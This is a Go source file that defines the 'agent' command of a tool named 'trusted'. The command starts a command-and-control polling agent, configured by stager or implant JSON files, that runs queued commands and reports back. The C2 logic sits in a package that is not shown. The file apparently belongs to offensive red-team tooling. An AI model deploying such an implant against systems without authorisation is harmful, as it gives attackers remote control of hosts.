package main

import (
	"github.com/loudmumble/trusted/pkg/c2"
	"github.com/spf13/cobra"
)

var agentCmd = &cobra.Command{
	Use:   "agent",
	Short: "Run C2 polling agent",
	Long: `Run a lightweight C2 polling agent that checks in with the listener,
executes queued commands, and returns results.

Examples:
  trusted agent --config stager.json
  trusted agent --config cert-auth-implant/administrator-implant.json`,
	RunE: func(cmd *cobra.Command, args []string) error {
		configPath, _ := cmd.Flags().GetString("config")
		return c2.RunAgent(configPath)
	},
}

func init() {
	rootCmd.AddCommand(agentCmd)
	agentCmd.Flags().String("config", "", "Path to stager/implant config JSON (required)")
	agentCmd.MarkFlagRequired("config")
}
